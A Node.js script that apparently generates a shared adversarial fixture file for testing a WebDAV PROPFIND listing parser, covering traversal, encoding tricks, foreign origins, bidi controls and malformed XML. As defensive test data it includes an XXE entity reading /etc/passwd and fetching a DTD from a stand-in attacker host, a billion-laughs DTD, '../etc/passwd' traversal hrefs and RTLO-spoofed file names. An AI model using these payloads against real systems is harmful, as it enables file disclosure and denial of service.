#!/usr/bin/env node
'use strict';
// Regenerates tests/fixtures/dav-listing.v1.json (#967): a synthetic, adversarial PROPFIND fixture
// table whose expectations come from the JS reference (tests/server/oracle/dav-listing.cjs listingRecordsJs).
// The same file is committed byte-for-byte in sbstndalton/noevia-rs
// (crates/dav-parse/tests/fixtures/dav-listing.v1.json); both repos' CI compare it.
//   node tools/gen-dav-listing-fixtures.cjs > tests/fixtures/dav-listing.v1.json
// Every name, host and path below is made up. No real storage content.

const { listingRecordsJs } = require('../tests/server/oracle/dav-listing.cjs');

const T = 'https://dav.example.test/remote.php/dav/files/alice/Notes/';
const DIR = '/remote.php/dav/files/alice/Notes';
const ms = (...responses) => `<?xml version="1.0" encoding="utf-8"?>\n<d:multistatus xmlns:d="DAV:" xmlns:oc="http://owncloud.org/ns">${responses.join('')}</d:multistatus>`;
const resp = (href, props = '', p = 'd') => `<${p}:response><${p}:href>${href}</${p}:href><${p}:propstat><${p}:prop>${props}</${p}:prop><${p}:status>HTTP/1.1 200 OK</${p}:status></${p}:propstat></${p}:response>`;
const file = (href, size = '12') => resp(href, `<d:resourcetype/><d:getcontentlength>${size}</d:getcontentlength>`);
const dir = (href) => resp(href, '<d:resourcetype><d:collection/></d:resourcetype>');
const self = dir(`${DIR}/`);

const cases = [];
const add = (name, body, target = T) => cases.push({ name, target, body });

// ── ordinary listings ──
add('nextcloud listing', ms(self, file(`${DIR}/a.md`, '120'), dir(`${DIR}/Sub/`), file(`${DIR}/b.txt`, '0')));
add('empty folder', ms(self));
add('empty body', '');
add('not xml', '{"entries":[]}');
add('no prefix', `<multistatus xmlns="DAV:"><response><href>${DIR}/plain.md</href><propstat><prop><getcontentlength>5</getcontentlength></prop></propstat></response></multistatus>`);
add('other prefixes', ms(resp(`${DIR}/x.md`, '<D:collection/>', 'D'), resp(`${DIR}/y.md`, '<lp1:getcontentlength>9</lp1:getcontentlength>', 'ns0')));
add('mixed prefixes open/close', `<a:response><b:href>${DIR}/m.md</c:href></z:response>`);
add('upper-case tag names do not match', `<D:RESPONSE><D:HREF>${DIR}/u.md</D:HREF></D:RESPONSE>`);
add('prefix with dash does not match', `<d-x:response><d:href>${DIR}/dash.md</d:href></d-x:response>`);
add('relative hrefs', ms(file('a.md'), file('./b.md'), file('Notes/c.md'), file('../Notes/d.md')));
add('absolute same-origin URL', ms(file(`https://dav.example.test${DIR}/abs.md`)));
add('absolute foreign host, same path (#969: skipped)', ms(file(`https://elsewhere.example.test${DIR}/foreign.md`)));
add('protocol-relative', ms(file(`//elsewhere.example.test${DIR}/pr.md`)));
add('non-http schemes', ms(file(`javascript:${DIR}/js.md`), file(`file://${DIR}/f.md`), file(`mailto:${DIR}/m.md`), file(`data:text/plain,${DIR}/d.md`)));
add('backslashes', ms(file(`\\remote.php\\dav\\files\\alice\\Notes\\bs.md`), file(`${DIR}\\bs2.md`)));
add('target without trailing slash', ms(file(`${DIR}/n.md`)), T.slice(0, -1));
add('target with encoded space', ms(file('/dav/My%20Docs/a.md'), file('/dav/My Docs/b.md'), dir('/dav/My%20Docs/')), 'https://dav.example.test/dav/My%20Docs/');
add('target with unicode', ms(file('/dav/%C3%A9t%C3%A9/a.md'), file('/dav/été/b.md')), 'https://dav.example.test/dav/%C3%A9t%C3%A9/');
add('target root', ms(file('/a.md'), file('/b/c.md'), dir('/')), 'https://dav.example.test/');
add('target with port and userinfo', ms(file(`${DIR}/p.md`)), `https://user:pw@dav.example.test:8443${DIR}/`);
add('invalid target', ms(file(`${DIR}/a.md`)), 'not a url');
add('target with bad percent', ms(file(`${DIR}/a.md`)), 'https://dav.example.test/dav/%zz/');
add('target with invalid utf-8', ms(file(`${DIR}/a.md`)), 'https://dav.example.test/dav/%C3%28/');
add('target empty', ms(file(`${DIR}/a.md`)), '');

// ── traversal and path normalisation ──
add('dot-dot out of the folder', ms(file(`${DIR}/../../../../etc/passwd`), file(`${DIR}/../Other/x.md`)));
add('dot-dot back into the folder', ms(file(`${DIR}/Sub/../back.md`), file(`${DIR}/./dot.md`)));
add('encoded dot-dot', ms(file(`${DIR}/%2e%2e/x.md`), file(`${DIR}/%2E%2E/y.md`), file(`${DIR}/.%2e/z.md`), file(`${DIR}/%2e/w.md`)));
add('encoded dot-dot as a name', ms(file(`${DIR}/%2e%2e`), file(`${DIR}/%2E`), file(`${DIR}/..%2f`)));
add('encoded slash adds a level', ms(file(`${DIR}/a%2Fb.md`), file(`${DIR}/a%2fb.md`), file(`${DIR}/%2F`)));
add('double-encoded slash stays a name', ms(file(`${DIR}/a%252Fb.md`), file(`${DIR}/%252e%252e`)));
add('encoded backslash', ms(file(`${DIR}/a%5Cb.md`), file(`${DIR}/..%5C..%5Cx.md`)));
add('dir prefix but not a child', ms(file(`${DIR}Evil/x.md`), file(`${DIR}-x.md`), file(`${DIR}`)));
add('grandchildren skipped', ms(file(`${DIR}/Sub/deep.md`), file(`${DIR}/Sub/`), file(`${DIR}//double.md`)));
add('many trailing slashes', ms(dir(`${DIR}/Many///`), file(`${DIR}////`)));
add('query and fragment', ms(file(`${DIR}/q.md?x=1`), file(`${DIR}/f.md#frag`), file(`${DIR}/?only`), file(`${DIR}/%3Fq.md`), file(`${DIR}/%23h.md`)));
add('NUL and controls in names', ms(file(`${DIR}/%00.md`), file(`${DIR}/a%01b`), file(`${DIR}/%7F`), file(`${DIR}/tab%09name`), file(`${DIR}/nl%0Aname`)));
add('raw controls stripped by the URL parser', ms(file(`${DIR}/ta\tb.md`), file(`${DIR}/n\nl.md`), file(`${DIR}/c\rr.md`)));
add('dot names', ms(file(`${DIR}/.hidden`), file(`${DIR}/...`), file(`${DIR}/.`)));
add('very long name', ms(file(`${DIR}/${'n'.repeat(3000)}.md`)));

// ── #969: foreign origins are skipped, same-origin absolute and relative hrefs kept ──
add('#969 hosts, ports and schemes', ms(
  file(`https://dav.example.test${DIR}/same.md`), file(`https://DAV.Example.TEST${DIR}/case.md`), file(`https://dav.example.test:443${DIR}/default-port.md`),
  file(`https://dav.example.test:8443${DIR}/other-port.md`), file(`http://dav.example.test${DIR}/http.md`), file(`ftp://dav.example.test${DIR}/ftp.md`),
  file(`wss://dav.example.test${DIR}/wss.md`), file(`https://evil.example.test${DIR}/evil.md`), file(`https://dav.example.test.evil.test${DIR}/suffix.md`),
  file(`https://evil.test/dav.example.test${DIR}/path.md`), file(`https://127.0.0.1${DIR}/ip.md`), file(`https://[::1]${DIR}/v6.md`),
  file(`HTTPS://dav.example.test${DIR}/upper-scheme.md`), file(`https:dav.example.test${DIR}/no-slashes.md`), file(`https:/${DIR}/one-slash.md`),
  file(`/\\evil.example.test${DIR}/bs-host.md`), file(`\\\\evil.example.test${DIR}/unc.md`), file(`//dav.example.test${DIR}/pr-same.md`), file(`rel.md`)));
add('#969 userinfo', ms(
  file(`https://user:pw@dav.example.test${DIR}/ui-same.md`), file(`https://dav.example.test@evil.example.test${DIR}/ui-evil.md`),
  file(`https://evil.example.test@dav.example.test${DIR}/ui-trick.md`), file(`https://dav.example.test%40evil.example.test${DIR}/pct-at.md`)));
add('#969 IDN', ms(
  file(`https://bücher.example.test${DIR}/idn.md`), file(`https://xn--bcher-kva.example.test${DIR}/puny.md`), file(`https://dаv.example.test${DIR}/cyrillic-a.md`),
  file(`https://ｄａｖ.example.test${DIR}/fullwidth.md`)));
add('#969 IDN target', ms(file(`https://bücher.example.test${DIR}/u.md`), file(`https://xn--bcher-kva.example.test${DIR}/p.md`), file(`${DIR}/rel.md`)), `https://xn--bcher-kva.example.test${DIR}/`);
add('#969 port target', ms(file(`https://dav.example.test${DIR}/noport.md`), file(`https://dav.example.test:8443${DIR}/port.md`), file(`${DIR}/rel.md`)), `https://dav.example.test:8443${DIR}/`);
add('#969 http target', ms(file(`https://dav.example.test${DIR}/s.md`), file(`http://dav.example.test:80${DIR}/p.md`), file(`${DIR}/rel.md`)), `http://dav.example.test${DIR}/`);

// ── #970: dot segments and encoded separators ──
add('#970 encoded dot-dot names', ms(
  file(`${DIR}/..%2f`), file(`${DIR}/..%2F`), file(`${DIR}/.%2f`), file(`${DIR}/%2e%2e%2f`), file(`${DIR}/%2e%2e%2F%2F`), file(`${DIR}/%2e%2e`),
  file(`${DIR}/%2E%2e`), file(`${DIR}/.%2E`), file(`${DIR}/%2e`), file(`${DIR}/..%5c`), file(`${DIR}/%2e%2e%5C`), file(`${DIR}/..%5C..`),
  file(`${DIR}/%5c`), file(`${DIR}/a%5cb`), file(`${DIR}/..%2fx`), file(`${DIR}/...%2f`), file(`${DIR}/..a`), file(`${DIR}/a..`), file(`${DIR}/ok.md`)));
add('#970 dot-dot via entities', ms(file(`${DIR}/&#46;&#46;&#37;2f`), file(`${DIR}/&#x2e;&#x2E;%2F`), file(`${DIR}/&#46;%2f`)));

// ── #971: controls, backslashes and bidi controls ──
add('#971 NUL, DEL and C0', ms(file(`${DIR}/a%00b`), file(`${DIR}/%7Fx`), file(`${DIR}/x%1F`), file(`${DIR}/%1B[31m`), file(`${DIR}/bell%07`), file(`${DIR}/ok%20space`)));
add('#971 C1', ms(file(`${DIR}/c1%C2%80`), file(`${DIR}/c1%C2%85`), file(`${DIR}/c1%C2%9B`), file(`${DIR}/c1%C2%9F`), file(`${DIR}/nbsp%C2%A0ok`), file(`${DIR}/raw\u0085nel`), file(`${DIR}/raw\u009fc1`)));
add('#971 C1 via entities', ms(file(`${DIR}/e&#x85;`), file(`${DIR}/e&#159;`), file(`${DIR}/e&#127;`), file(`${DIR}/e&#1;`), file(`${DIR}/e&#160;ok`)));
for (const cp of [0x202a, 0x202b, 0x202c, 0x202d, 0x202e, 0x2066, 0x2067, 0x2068, 0x2069, 0x200e, 0x200f, 0x061c]) {
  const ch = String.fromCodePoint(cp);
  const pct = encodeURIComponent(ch);
  add(`#971 bidi U+${cp.toString(16).toUpperCase().padStart(4, '0')}`, ms(file(`${DIR}/${pct}gnp.exe`), file(`${DIR}/a${ch}b`), file(`${DIR}/x&#${cp};`), file(`${DIR}/x&#x${cp.toString(16)};y`), file(`${DIR}/clean.md`)));
}
add('#971 near-bidi characters stay', ms(file(`${DIR}/zw%E2%80%8B.md`), file(`${DIR}/zwj%E2%80%8D.md`), file(`${DIR}/%E2%80%AF.md`), file(`${DIR}/%E2%81%A0.md`), file(`${DIR}/%E2%81%AA.md`), file(`${DIR}/%D8%9B.md`), file(`${DIR}/%D8%9D.md`)));
add('#971 backslashes', ms(file(`${DIR}/a%5Cb.md`), file(`${DIR}/%5C`), file(`${DIR}/x&#92;y`), file(`${DIR}/x&#x5c;`)));
add('#969-#971 mixed', ms(self, file(`${DIR}/good.md`), file(`https://evil.example.test${DIR}/%E2%80%AE..%2f`), file(`${DIR}/%E2%80%AE..%5c`), file(`${DIR}/..%2f%00`),
  dir(`${DIR}/Sub%E2%81%A6/`), file(`${DIR}/also-good.md`), file(`https://dav.example.test${DIR}/%C2%9Bx`), file(`https://dav.example.test${DIR}/fine.md`)));

// ── percent and unicode decoding ──
add('percent-encoded utf-8', ms(file(`${DIR}/%C3%A9t%C3%A9.md`), file(`${DIR}/%E2%80%AE.md`), file(`${DIR}/%F0%9F%98%80.md`)));
add('raw unicode', ms(file(`${DIR}/été.md`), file(`${DIR}/日本語.txt`), file(`${DIR}/emoji😀.md`), file(`${DIR}/ｆｕｌｌ.md`)));
add('NFC and NFD stay distinct', ms(file(`${DIR}/café.md`), file(`${DIR}/café.md`)));
add('invalid utf-8 sequences are dropped', ms(file(`${DIR}/%C3%28.md`), file(`${DIR}/%C0%AF.md`), file(`${DIR}/%ED%A0%80.md`), file(`${DIR}/%F4%90%80%80.md`), file(`${DIR}/%FF.md`), file(`${DIR}/ok.md`)));
add('bad percent escapes are dropped', ms(file(`${DIR}/%.md`), file(`${DIR}/%G1.md`), file(`${DIR}/%4.md`), file(`${DIR}/100%`), file(`${DIR}/fine.md`)));
add('lead byte then literal', ms(file(`${DIR}/%C3é.md`), file(`${DIR}/%E2%80.md`)));
add('lone surrogate in body text', ms(file(`${DIR}/\ud800x.md`), file(`${DIR}/y\udfff.md`)));
add('bidi and zero-width', ms(file(`${DIR}/‮gnp.exe`), file(`${DIR}/zero​width.md`)));

// ── XML entities, DTD, XXE, billion laughs ──
add('predefined entities', ms(file(`${DIR}/a&amp;b.md`), file(`${DIR}/&lt;x&gt;.md`), file(`${DIR}/&quot;q&quot;&apos;.md`)));
add('numeric references', ms(file(`${DIR}/&#38;.md`), file(`${DIR}/&#x26;h.md`), file(`${DIR}/&#X26;up.md`), file(`${DIR}/&#0065;&#x00042;.md`), file(`${DIR}/&#x1F600;.md`)));
add('invalid numeric references stay', ms(file(`${DIR}/&#0;.md`), file(`${DIR}/&#xD800;.md`), file(`${DIR}/&#1114112;.md`), file(`${DIR}/&#x110000;.md`), file(`${DIR}/&#99999999999999999999999;.md`), file(`${DIR}/&#x${'f'.repeat(300)};.md`), file(`${DIR}/&#;.md`), file(`${DIR}/&#x;.md`), file(`${DIR}/&#12a;.md`)));
add('entity edge spellings', ms(file(`${DIR}/&AMP;.md`), file(`${DIR}/&amp.md`), file(`${DIR}/&amp;amp;.md`), file(`${DIR}/&nbsp;.md`), file(`${DIR}/&&amp;;.md`), file(`${DIR}/&#38;amp;.md`)));
add('entity decodes to a slash or dot-dot', ms(file(`${DIR}/a&#47;b.md`), file(`${DIR}/&#46;&#46;/x.md`), file(`&#47;remote.php/dav/files/alice/Notes/viaent.md`)));
add('entity decodes to percent', ms(file(`${DIR}/&#37;2e&#37;2e`), file(`${DIR}/x&#37;2Fy.md`)));
add('billion laughs DTD is inert', `<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">]>${ms(file(`${DIR}/&lol3;.md`), file(`${DIR}/plain.md`))}`);
add('XXE system entity is inert', `<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd"><!ENTITY % pe SYSTEM "http://attacker.example.test/x.dtd"> %pe;]>${ms(file(`${DIR}/&xxe;.md`), file(`${DIR}/%pe;.md`))}`);
add('CDATA and comments are not understood', ms(file(`<![CDATA[${DIR}/cdata.md]]>`), file(`<!-- c -->${DIR}/comment.md`), `<!-- <d:response><d:href>${DIR}/hidden.md</d:href></d:response> -->`));
add('processing instruction in href', ms(file(`<?pi x?>${DIR}/pi.md`)));

// ── whitespace ──
add('surrounding whitespace trimmed', ms(file(`  \n\t${DIR}/ws.md \r\n`), file(` ${DIR}/nbsp.md `), file(`﻿${DIR}/bom.md　`), file(` ${DIR}/ls.md `)));
add('NEL is not JS whitespace', ms(file(`\u0085${DIR}/nel.md`), file(`${DIR}/nel2.md\u0085`)));
add('inner whitespace kept', ms(file(`${DIR}/two words.md`), file(`${DIR}/nb sp.md`), file(`${DIR}/ide　o.md`)));
add('whitespace-only href', ms(file('   '), file('')));

// ── collection and size detection ──
add('collection spellings', ms(
  resp(`${DIR}/c1`, '<d:collection/>'), resp(`${DIR}/c2`, '<collection />'), resp(`${DIR}/c3`, '<d:collection>'),
  resp(`${DIR}/c4`, '<d:collection xmlns:d="DAV:"/>'), resp(`${DIR}/c5`, '<d:collection　 />'), resp(`${DIR}/c6`, '<d:collectionx/>'),
  resp(`${DIR}/c7`, '<d:collection//>'), resp(`${DIR}/c8`, '<x-y:collection/>'), resp(`${DIR}/c9`, '<:collection/>'), resp(`${DIR}/c10`, '<D:Collection/>'),
  resp(`${DIR}/c11`, '<d:collection\u0085/>'), resp(`${DIR}/c12`, '<a:b:collection/>')));
add('collection outside the prop', `<d:response><d:href>${DIR}/outside</d:href></d:response><d:collection/>`);
add('size spellings', ms(
  resp(`${DIR}/s1`, '<d:getcontentlength>007</d:getcontentlength>'), resp(`${DIR}/s2`, '<d:getcontentlength> 7</d:getcontentlength>'),
  resp(`${DIR}/s3`, '<d:getcontentlength>-7</d:getcontentlength>'), resp(`${DIR}/s4`, '<d:getcontentlength>7.5</d:getcontentlength>'),
  resp(`${DIR}/s5`, '<d:getcontentlength>٣</d:getcontentlength>'), resp(`${DIR}/s6`, `<d:getcontentlength>${'9'.repeat(400)}</d:getcontentlength>`),
  resp(`${DIR}/s7`, '<d:getcontentlength>12</d:getcontentlength><d:getcontentlength>34</d:getcontentlength>'),
  resp(`${DIR}/s8`, '<d:getcontentlength>x</d:getcontentlength><getcontentlength>56</getcontentlength>'),
  resp(`${DIR}/s9`, '<d:getcontentlength a="1">5</d:getcontentlength>'), resp(`${DIR}/s10`, '<d:getcontentlength>9007199254740993</d:getcontentlength>'),
  resp(`${DIR}/s11`, '<d:getcontentlength>5<x/></d:getcontentlength>'), resp(`${DIR}/s12`, '<d:getcontentlength></d:getcontentlength>')));

// ── malformed structure ──
add('response without href', ms(resp('', ''), `<d:response><d:propstat/></d:response>`, file(`${DIR}/after.md`)));
add('two hrefs, first wins', `<d:response><d:href>${DIR}/first.md</d:href><d:href>${DIR}/second.md</d:href></d:response>`);
add('nested responses', `<d:response><d:response><d:href>${DIR}/inner.md</d:href></d:response><d:href>${DIR}/outer.md</d:href></d:response>`);
add('unclosed response', `<d:response><d:href>${DIR}/open.md</d:href>`);
add('unclosed href', `<d:response><d:href>${DIR}/open.md</d:response>`);
add('close before open', `</d:response><d:href>${DIR}/x.md</d:href><d:response><d:href>${DIR}/y.md</d:href></d:response>`);
add('stray angle brackets', ms(file(`${DIR}/a<b.md`), file(`${DIR}/a>b.md`), `<<d:response><d:href>${DIR}/lt.md</d:href></d:response>`));
add('tag with attributes does not match', `<d:response id="1"><d:href>${DIR}/attr.md</d:href></d:response><d:response><d:href lang="en">${DIR}/attr2.md</d:href></d:response>`);
add('many unclosed opening tags (no quadratic scan)', '<d:response><d:href>'.repeat(20000));
add('many unclosed closing-like tags', `<d:response>${'</d:respons'.repeat(20000)}`);
add('duplicate entries kept in order', ms(file(`${DIR}/dup.md`, '1'), file(`${DIR}/dup.md`, '2'), file(`${DIR}/dup.md/`, '3')));
add('a thousand entries', ms(self, ...Array.from({ length: 1000 }, (_, i) => file(`${DIR}/f${i}.md`, String(i)))));

// ── seeded random listings ──
let seed = 0x967;
const rand = () => { seed = (seed * 1103515245 + 12345) >>> 0; return seed / 2 ** 32; };
const pick = (a) => a[Math.floor(rand() * a.length)];
const pieces = ['a', 'Z', '0', '.', '..', '/', '//', '%', '%2e', '%2E', '%2F', '%2f', '%25', '%C3%A9', '%E2%80%AE', '%C3', '%FF', '%00', '%5C', '\\',
  '&amp;', '&lt;', '&#38;', '&#x2F;', '&#47;', '&#0;', '&#xD800;', '&bogus;', '&', ';', '#', '?', ' ', '\t', ' ', '\u0085', '﻿',
  'é', 'é', '日', '😀', '\ud800', '<', '>', '<d:x/>', ':', '@', 'Notes', 'alice', 'remote.php', '‮', '　',
  '%2e%2e%2f', '..%2f', '..%5C', '%00', '%7F', '%C2%80', '%C2%9F', '%C2%85', '\u0085', '\u009b', '\u007f', '\u0001', '&#x85;', '&#127;', '&#92;',
  '%E2%80%AA', '%E2%80%AB', '%E2%80%AC', '%E2%80%AD', '%E2%81%A6', '%E2%81%A7', '%E2%81%A8', '%E2%81%A9', '%E2%80%8E', '%E2%80%8F', '%D8%9C',
  '\u202a', '\u202d', '\u2066', '\u2069', '\u200e', '\u200f', '\u061c', '&#x202E;', '&#8207;'];
const prefixes = [`${DIR}/`, `${DIR}/`, `${DIR}/`, '', '/', '../', `https://dav.example.test${DIR}/`, `//other.example.test${DIR}/`, `${DIR}`, `https://dav.example.test:8443${DIR}/`,
  `http://dav.example.test${DIR}/`, `https://u:p@dav.example.test${DIR}/`, `https://dav.example.test@other.example.test${DIR}/`, `https://xn--dv-ilb.example.test${DIR}/`, `${DIR}/Sub/`, 'Notes/'];
const tagPrefixes = ['d', 'D', 'lp1', '', 'x-y', 'ns0'];
const tag = (p, n) => (p ? `${p}:${n}` : n);
for (let n = 0; n < 500; n++) {
  const blocks = [];
  const count = Math.floor(rand() * 6);
  for (let b = 0; b < count; b++) {
    let name = '';
    const len = 1 + Math.floor(rand() * 6);
    for (let i = 0; i < len; i++) name += pick(pieces);
    const p = pick(tagPrefixes);
    const props = [
      rand() < 0.3 ? `<${tag(pick(tagPrefixes), 'collection')}${pick(['', '/', ' /', '　/'])}>` : '',
      rand() < 0.5 ? `<${tag(pick(tagPrefixes), 'getcontentlength')}>${pick(['1', '42', '007', '', 'x', '-1', '1e3', '99999999999999999999'])}</${tag(p, 'getcontentlength')}>` : '',
    ].join('');
    const closeHref = rand() < 0.95 ? `</${tag(pick(tagPrefixes), 'href')}>` : '';
    const closeResp = rand() < 0.95 ? `</${tag(p, 'response')}>` : '';
    blocks.push(`<${tag(p, 'response')}><${tag(p, 'href')}>${pick(prefixes)}${name}${closeHref}<${tag(p, 'prop')}>${props}</${tag(p, 'prop')}>${closeResp}`);
  }
  const target = rand() < 0.9 ? T : pick(['https://dav.example.test/', 'https://dav.example.test/dav/%C3%A9/', 'http://[::1]:8080/a/b/', 'https://dav.example.test/a%2Fb/']);
  add(`random ${n}`, ms(...blocks), target);
}

const out = {
  version: 1,
  generator: 'noevia-core tools/gen-dav-listing-fixtures.cjs (expectations from server/dav-listing.cjs listingRecordsJs)',
  // Lone surrogates cannot cross into Rust (or JSON readers that insist on Unicode scalars): the
  // committed bodies are made well-formed (U+FFFD), exactly what TextEncoder does on the way into
  // the WebAssembly module. core's live differential still feeds raw lone surrogates to both.
  cases: cases.map(({ name, target: rawTarget, body: rawBody }) => {
    const body = rawBody.toWellFormed(), target = rawTarget.toWellFormed();
    let expect;
    try { expect = { entries: listingRecordsJs(body, target) }; } catch { expect = { error: 'invalid_target' }; }
    return { name, target, body, expect };
  }),
};
process.stdout.write(`${JSON.stringify(out, null, 1)}\n`);
